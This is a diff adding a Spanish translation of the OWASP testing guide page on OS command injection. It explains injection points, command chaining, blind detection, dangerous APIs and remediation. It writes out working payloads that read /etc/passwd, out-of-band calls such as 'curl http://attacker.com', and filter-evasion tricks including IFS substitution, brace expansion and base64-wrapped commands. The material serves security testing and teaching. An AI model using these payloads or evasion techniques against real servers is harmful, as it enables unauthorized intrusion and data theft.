@@ -1,0 +1,248 @@
+<h1 id="command-injection">Inyección de comandos</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-INJT-12</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>Este artículo describe cómo probar una aplicación en busca de inyección de comandos del sistema operativo. El evaluador intentará inyectar un comando del sistema operativo mediante una petición HTTP a la aplicación.</p>
+<p>La inyección de comandos del sistema operativo es una vulnerabilidad que se produce cuando la entrada del usuario se pasa directamente a un comando del sistema operativo sin la debida validación o saneamiento. Esto permite al usuario inyectar y ejecutar comandos arbitrarios en el servidor, lo que puede conducir a acceso no autorizado a datos, corrupción de datos y compromiso total del servidor. Esta vulnerabilidad se puede prevenir dando prioridad a la seguridad durante el diseño y el desarrollo de las aplicaciones.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar y evaluar los puntos de inyección de comandos.</li>
+<li>Eludir los filtros de caracteres especiales y de comandos del sistema operativo.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Al visualizar un archivo en una aplicación web, el nombre del archivo suele aparecer en la URL. Perl permite canalizar datos de un proceso hacia una sentencia open. El usuario puede simplemente añadir el símbolo de tubería (pipe) <code>|</code> al final del nombre del archivo.</p>
+<p>Ejemplo de URL antes de la alteración:</p>
+<p><code>https://sensitive/cgi-bin/userData.pl?doc=user1.txt</code></p>
+<p>Ejemplo de URL modificada:</p>
+<p><code>https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls</code></p>
+<p>Esto ejecutará el comando <code>/bin/ls</code>.</p>
+<p>Añadir un punto y coma al final de la URL de una página .PHP seguido de un comando del sistema operativo ejecutará el comando. <code>%3B</code> es la codificación URL del punto y coma.</p>
+<p>Ejemplo:</p>
+<p><code>https://sensitive/something.php?dir=%3Bcat%20/etc/passwd</code></p>
+<h3 id="example">Ejemplo</h3>
+<p>Considérese el caso de una aplicación que contiene un conjunto de documentos que se pueden explorar desde Internet. Si se pone en marcha un proxy personal (como ZAP o Burp Suite), se puede obtener un POST HTTP como el siguiente (<code>https://www.example.com/public/doc</code>):</p>
+<pre><code class="language-txt">POST /public/doc HTTP/1.1
+Host: www.example.com
+[...]
+Referer: https://127.0.0.1/WebGoat/attack?Screen=20
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 33
+
+Doc=Doc1.pdf
+</code></pre>
+<p>En esta petición POST observamos cómo la aplicación recupera la documentación pública. Ahora podemos probar si es posible añadir un comando del sistema operativo para inyectarlo en el POST HTTP. Se prueba lo siguiente (<code>https://www.example.com/public/doc</code>):</p>
+<pre><code class="language-txt">POST /public/doc HTTP/1.1
+Host: www.example.com
+[...]
+Referer: https://127.0.0.1/WebGoat/attack?Screen=20
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 33
+
+Doc=Doc1.pdf+|+Dir c:\
+</code></pre>
+<p>Si la aplicación no valida la petición, podemos obtener el siguiente resultado:</p>
+<pre><code class="language-txt">    Exec Results for &#39;cmd.exe /c type &quot;C:\httpd\public\doc\&quot;Doc=Doc1.pdf+|+Dir c:\&#39;
+    Output...
+    Il volume nell&#39;unità C non ha etichetta.
+    Numero di serie Del volume: 8E3F-4B61
+    Directory of c:\
+     18/10/2006 00:27 2,675 Dir_Prog.txt
+     18/10/2006 00:28 3,887 Dir_ProgFile.txt
+     16/11/2006 10:43
+        Doc
+        11/11/2006 17:25
+           Documents and Settings
+           25/10/2006 03:11
+              I386
+              14/11/2006 18:51
+             h4ck3r
+             30/09/2005 21:40 25,934
+            OWASP1.JPG
+            03/11/2006 18:29
+                Prog
+                18/11/2006 11:20
+                    Program Files
+                    16/11/2006 21:12
+                        Software
+                        24/10/2006 18:25
+                            Setup
+                            24/10/2006 23:37
+                                Technologies
+                                18/11/2006 11:14
+                                3 File 32,496 byte
+                                13 Directory 6,921,269,248 byte disponibili
+                                Return code: 0
+</code></pre>
+<p>En este caso, hemos realizado con éxito un ataque de inyección en el sistema operativo.</p>
+<h2 id="special-characters-for-command-injection">Caracteres especiales para la inyección de comandos</h2>
+<p>Los caracteres especiales se utilizan para encadenar varios comandos.
+Estos caracteres varían según el sistema operativo que ejecuta el servidor web.
+Por ejemplo, los siguientes tipos de encadenamiento de comandos se pueden usar tanto en sistemas Windows como en sistemas basados en Unix:</p>
+<ul>
+<li><code>cmd1|cmd2</code> : cmd2 se ejecutará tenga éxito o no cmd1.</li>
+<li><code>cmd1||cmd2</code> : cmd2 solo se ejecutará si cmd1 falla.</li>
+<li><code>cmd1&amp;&amp;cmd2</code> : cmd2 solo se ejecutará si cmd1 tiene éxito.</li>
+<li><code>cmd1&amp;cmd2</code> : cmd2 se ejecutará tenga éxito o no cmd1.</li>
+</ul>
+<p>El punto y coma <code>;</code> funcionará en sistemas basados en Unix y en PowerShell. Sin embargo, no funcionará en el Símbolo del sistema de Windows (CMD).<br>Además, se puede usar la sustitución de comandos de Bash <code>$(cmd)</code> o &grave;<code>cmd</code>&grave; para ejecutar comandos en sistemas basados en Unix.<br>Adicionalmente, también se pueden usar descriptores de archivo de Linux como <code>&gt;(cmd)</code>, <code>&lt;(cmd)</code>.</p>
+<h2 id="additional-command-injection-techniques">Técnicas adicionales de inyección de comandos</h2>
+<p>Los atacantes pueden aprovechar diferentes técnicas para ejecutar comandos del sistema operativo según el entorno y los mecanismos de filtrado.</p>
+<h3 id="command-substitution">Sustitución de comandos</h3>
+<p>La sustitución de comandos permite que la salida de un comando se utilice como entrada de otro comando.</p>
+<p>Ejemplos:</p>
+<pre><code class="language-bash">$(whoami)
+`whoami`
+</code></pre>
+<h3 id="command-chaining">Encadenamiento de comandos</h3>
+<p>Se pueden ejecutar varios comandos de forma secuencial utilizando operadores de encadenamiento de comandos.</p>
+<p>Ejemplos:</p>
+<pre><code class="language-bash">cmd1 ; cmd2
+cmd1 &amp;&amp; cmd2
+cmd1 || cmd2
+</code></pre>
+<h3 id="file-redirection">Redirección a archivos</h3>
+<p>Los atacantes pueden redirigir la salida de un comando a archivos accesibles por el servidor web.</p>
+<p>Ejemplo:</p>
+<pre><code class="language-bash">whoami &gt; /var/www/html/output.txt
+</code></pre>
+<h3 id="out-of-band-command-injection">Inyección de comandos fuera de banda (Out-of-Band)</h3>
+<p>Los atacantes pueden usar servicios externos para detectar la ejecución de comandos.</p>
+<p>Ejemplos:</p>
+<pre><code class="language-bash">curl http://attacker.com
+nslookup attacker.com
+</code></pre>
+<h2 id="filter-evasion">Evasión de filtros</h2>
+<p>Para prevenir la inyección de comandos del sistema operativo, los desarrolladores web suelen usar filtros. Sin embargo, estos filtros a veces no se implementan correctamente, lo que permite a los atacantes eludirlos.
+En esta sección cubriremos diferentes técnicas utilizadas para eludir esos filtros.</p>
+<h3 id="methodology">Metodología</h3>
+<p>En primer lugar, siempre es una buena práctica tener una comprensión básica de cómo funciona el filtro antes de intentar eludirlo.
+Esta es una metodología que podemos usar cuando nos encontramos con un filtro:</p>
+<ul>
+<li>¿El filtro es del lado del cliente o del lado del servidor?</li>
+<li>¿El filtro se aplica a caracteres especiales, a comandos del sistema operativo o a ambos?</li>
+<li>¿La aplicación web usa un filtro de lista de permitidos (allowlist) o de lista de bloqueados (blocklist)?</li>
+<li>¿Qué sistema operativo ejecuta el servidor web? Esto nos da una idea de los comandos y caracteres especiales que podemos usar.</li>
+</ul>
+<h3 id="special-characters-filter-evasion">Evasión de filtros de caracteres especiales</h3>
+<p>Como se mencionó anteriormente, los filtros pueden aplicarse a caracteres especiales, a comandos del sistema operativo o a ambos.
+Para eludir los filtros aplicados a caracteres especiales, podemos usar variables de entorno, la expansión de llaves de Bash o la codificación URL.</p>
+<h4 id="url-encoding">Codificación URL</h4>
+<p>Codificar en URL los caracteres especiales puede permitirnos eludir el filtro si el servidor web solo bloquea los caracteres especiales en texto plano.
+Estos son algunos caracteres especiales con su formato codificado en URL:</p>
+<div class="tabla"><table><thead><tr>
+<th>Carácter especial</th>
+<th>Codificación URL</th>
+</tr>
+</thead><tbody><tr>
+<td>;</td>
+<td>%3b</td>
+</tr>
+<tr>
+<td>espacio</td>
+<td>%20</td>
+</tr>
+<tr>
+<td>tabulador</td>
+<td>%09</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>%26</td>
+</tr>
+<tr>
+<td>Nueva línea</td>
+<td>%0a</td>
+</tr>
+</tbody></table></div>
+<p>Por ejemplo, en lugar de usar <code>;whoami</code>, podríamos usar <code>%3bwhoami</code>.</p>
+<h4 id="environment-variables">Variables de entorno</h4>
+<p>Los caracteres especiales como el espacio, el punto y coma, el tabulador o la nueva línea generalmente serán filtrados por el servidor web, especialmente si no son útiles para la entrada especificada.<br>Para escapar de esta restricción, podemos usar variables de entorno como <strong>IFS</strong>, <strong>PATH</strong> o <strong>LS_COLORS</strong> en Linux, y <strong>HOMEPATH</strong> en Windows.<br>Por ejemplo, en Linux, <code>/</code>, <code>;</code> y <code>[espacio]</code> pueden reemplazarse respectivamente por <code>${PATH:0:1}</code>, <code>${LS_COLORS:10:1}</code> y <code>${IFS}</code>.<br>En Windows CMD, podemos reemplazar <code>\</code> por <code>%HOMEPATH:~6,1%</code>, o usar <code>$env:HOMEPATH[0]</code> en PowerShell.</p>
+<h4 id="bash-brace-expansion">Expansión de llaves de Bash</h4>
+<p>La expansión de llaves de Bash (brace expansion) es una funcionalidad de Bash que permite ejecutar comandos utilizando llaves.<br>Por ejemplo, <code>{ls,-la}</code> ejecutará el comando <code>ls -la</code>. Esto puede ser extremadamente útil si el servidor web filtra los caracteres de espacio, nueva línea o tabulador.<br>Supongamos que queremos mostrar el contenido del archivo &#39;/etc/passwd&#39;. Entonces, en lugar de usar <code>;cat /etc/passwd</code>, podemos usar <code>;{cat,/etc/passwd}</code>.
+Dicho esto, es importante tener en cuenta que esta técnica solo funcionará si el servidor web utiliza Bash y si caracteres como <code>}{/,;</code> no están filtrados.</p>
+<h3 id="commands-filter-evasion">Evasión de filtros de comandos</h3>
+<p>En esta sección vamos a explorar algunas técnicas utilizadas para eludir los filtros aplicados a comandos del sistema operativo.</p>
+<h4 id="case-modification">Modificación de mayúsculas y minúsculas</h4>
+<p>La modificación de mayúsculas y minúsculas es una técnica que se utiliza para eludir los filtros de comandos del sistema operativo. Será útil si el filtro del lado del servidor distingue entre mayúsculas y minúsculas.<br>Por ejemplo, si durante nuestras pruebas notamos que el servidor web bloquea <code>;whoami</code>, podemos intentar usar en su lugar <code>;WhoAmi</code>; si vemos que el filtro del lado del servidor solo bloquea los comandos en minúsculas, podremos eludirlo.<br>Esta técnica generalmente funcionará en sistemas Windows.<br>En Linux, usaremos una técnica llamada <strong>desplazamiento de caracteres</strong> (character shifting). Por ejemplo, el siguiente comando traducirá cada carácter en mayúscula a su correspondiente carácter en minúscula.  </p>
+<pre><code class="language-bash">;$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhoaMi&quot;)
+</code></pre>
+<h4 id="character-insertion">Inserción de caracteres</h4>
+<p>Caracteres como <code>\</code>; <code>$@</code>, <code>&#39;</code> pueden insertarse en comandos del sistema operativo Linux sin afectar la ejecución normal del comando.<br>Por ejemplo, <code>who\ami</code>, <code>w$@hoami</code> o <code>wh&#39;o&#39;ami</code> ejecutarán todos el comando <code>whoami</code>.  </p>
+<blockquote>
+<p>Nota: el número de comillas simples <code>&#39;</code> en el comando de Linux debe ser <strong>par</strong>, de lo contrario se obtendrá un error. Si se usa Windows CMD, asegúrese de usar comillas dobles <code>&quot;</code> en su lugar.<br>Además, también se puede usar un acento circunflejo <code>^</code> en comandos de CMD. Por ejemplo, <code>whoa^mi</code> ejecutará el comando <code>whoami</code>. Esto no funciona en PowerShell.</p>
+</blockquote>
+<h4 id="base64-encoding">Codificación Base64</h4>
+<p>En ciertos escenarios, el servidor web puede filtrar comandos como <code>whoami</code>, <code>id</code>, etc.<br>Supongamos que el servidor web bloquea <code>whoami</code>. Por lo tanto, no podemos usar un payload como <code>;whoami</code>.<br>Para eludir esta restricción, usaremos el formato codificado en base64 de <code>whoami</code> ejecutando: <code>echo -n &#39;whoami&#39; | base64</code>. Esto devolverá <code>d2hvYW1p</code>.
+Después de eso, enviaremos el siguiente payload: <code>;bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt; d2hvYW1p)</code> en el parámetro vulnerable. Esto debería eludir el filtro del lado del servidor y permitirnos lograr la ejecución remota de comandos.</p>
+<p><strong>Finalmente, tenga en cuenta que es posible que sea necesario combinar diferentes técnicas de evasión de filtros de caracteres especiales y de comandos del sistema operativo para eludir con éxito los filtros implementados por el servidor web.</strong></p>
+<h2 id="blind-command-injection">Inyección de comandos a ciegas (Blind)</h2>
+<p>A veces, es posible que no podamos ver la salida de nuestro comando inyectado en la respuesta HTTP del servidor web. Por lo tanto, necesitaremos encontrar una forma de confirmar si nuestra inyección tuvo éxito o no. Para ello, podemos usar servidores remotos <code>HTTP</code>, <code>DNS</code> o <code>SMTP</code> bajo nuestro control.<br>También podemos usar <strong>comandos del sistema con retardo de tiempo</strong> como <code>sleep</code> (Linux), <code>timeout</code> (Windows), o una utilidad de red como <code>ping</code>.<br>Por ejemplo, podemos ejecutar <code>;sleep(5)</code> y, si el servidor web espera 5 segundos antes de enviarnos una respuesta, podemos confirmar que es vulnerable a una inyección de comandos a ciegas.<br>Además, también podemos <strong>redirigir la salida del comando inyectado a la raíz web del servidor web</strong>. <code>;whoami&gt;/var/www/html/poc.txt;</code><br>Después de eso, podemos ejecutar <code>curl http://website.com/poc.txt</code>. Si logramos recuperar el archivo, podemos confirmar que el servidor web es vulnerable a una inyección de comandos a ciegas.</p>
+<h2 id="dangerous-command-execution-apis">APIs peligrosas de ejecución de comandos</h2>
+<p>Las siguientes APIs de distintos lenguajes de programación pueden ejecutar comandos del sistema operativo y pueden introducir vulnerabilidades de inyección de comandos si se utilizan con entradas de usuario sin sanear.</p>
+<div class="tabla"><table><thead><tr>
+<th>Lenguaje</th>
+<th>APIs peligrosas</th>
+</tr>
+</thead><tbody><tr>
+<td>Java</td>
+<td><code>Runtime.exec()</code></td>
+</tr>
+<tr>
+<td>C/C++</td>
+<td><code>system()</code>, <code>exec()</code>, <code>ShellExecute()</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>exec()</code>, <code>eval()</code>, <code>os.system()</code>, <code>os.popen()</code>, <code>subprocess.Popen()</code>, <code>subprocess.call()</code></td>
+</tr>
+<tr>
+<td>PHP</td>
+<td><code>system()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>proc_open()</code>, <code>eval()</code>, <code>passthru()</code></td>
+</tr>
+<tr>
+<td>Node.js</td>
+<td><code>child_process.exec()</code>, <code>execSync()</code>, <code>spawn()</code></td>
+</tr>
+<tr>
+<td>Ruby</td>
+<td><code>system()</code>, <code>exec()</code>, <code>Open3.popen3()</code></td>
+</tr>
+<tr>
+<td>Go</td>
+<td><code>exec.Command()</code></td>
+</tr>
+<tr>
+<td>C#</td>
+<td><code>Process.Start()</code></td>
+</tr>
+</tbody></table></div>
+<h2 id="remediation">Corrección</h2>
+<h3 id="sanitization">Saneamiento</h3>
+<p>Los parámetros de consulta de la URL y los datos de formularios deben validarse y sanearse para evitar la inyección de caracteres maliciosos.<br>Una lista de bloqueo (blocklist) de caracteres es una opción, pero puede ser difícil pensar en todos los caracteres contra los que validar. Además, puede haber algunos que aún no se hayan descubierto.<br>Se debe crear una lista de permitidos (allowlist) que contenga únicamente los caracteres o comandos autorizados para validar la entrada del usuario. Los caracteres que se hayan pasado por alto, así como las amenazas aún no descubiertas, deben ser eliminados por esta lista.  </p>
+<p>Una lista de denegación general para incluir en la prevención de la inyección de comandos puede ser <code>|</code> <code>;</code> <code>&amp;</code> <code>$</code> <code>&gt;</code> <code>&lt;</code> <code>&#39;</code> <code>\</code> <code>!</code> <code>&gt;&gt;</code> <code>#</code>  </p>
+<p>Escapar o filtrar los caracteres especiales para Windows, <code>(</code> <code>)</code> <code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>*</code> <code>‘</code> <code>|</code> <code>=</code> <code>?</code> <code>;</code> <code>[</code> <code>]</code> <code>^</code> <code>~</code> <code>!</code> <code>.</code> <code>&quot;</code> <code>%</code> <code>@</code> <code>/</code> <code>\</code> <code>:</code> <code>+</code> <code>,</code>  <code>`</code>  </p>
+<p>Escapar o filtrar los caracteres especiales para Linux, <code>{</code> <code>}</code> <code>(</code> <code>)</code> <code>&gt;</code> <code>&lt;</code> <code>&amp;</code> <code>*</code> <code>‘</code> <code>|</code> <code>=</code> <code>?</code> <code>;</code> <code>[</code> <code>]</code> <code>$</code> <code>-</code> <code>#</code> <code>~</code> <code>!</code> <code>.</code> <code>&quot;</code> <code>%</code>  <code>/</code> <code>\</code> <code>:</code> <code>+</code> <code>,</code> <code>`</code>  </p>
+<p>Además, evite usar funciones que ejecuten comandos del sistema operativo en su aplicación a menos que sea absolutamente necesario. Por ejemplo, en lugar de usar <code>system(&quot;cp /path/to/file1.txt /path/to/file2.txt&quot;)</code> para copiar un archivo, puede usar directamente la función integrada de php <code>copy(&quot;cp /path/to/file1.txt, /path/to/file2.txt&quot;)</code>, que hace exactamente lo mismo. Vale la pena señalar que otros lenguajes/frameworks de desarrollo generalmente ofrecen funcionalidad integrada similar.</p>
+<h3 id="permissions">Permisos</h3>
+<p>La aplicación web y sus componentes deben ejecutarse con permisos estrictos que no permitan la ejecución de comandos del sistema operativo. Intente verificar toda esta información para probar desde el punto de vista de las pruebas de caja gris.</p>
+<h2 id="tools">Herramientas</h2>
+<ul>
+<li>OWASP <a href="https://owasp.org/www-project-webgoat/" target="_blank" rel="noopener">WebGoat</a></li>
+<li><a href="https://github.com/commixproject/commix" target="_blank" rel="noopener">Commix</a></li>
+<li><a href="https://github.com/danielbohannon/Invoke-DOSfuscation" target="_blank" rel="noopener">Invoke-DOSfuscation</a></li>
+<li><a href="https://github.com/Bashfuscator/Bashfuscator" target="_blank" rel="noopener">Bashfuscator</a></li>
+</ul>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78: Improper Neutralization of Special Elements used in an OS Command (&#39;OS Command Injection&#39;)</a></li>
+<li><a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177" target="_blank" rel="noopener">ENV33-C. Do not call system()</a></li>
+</ul>
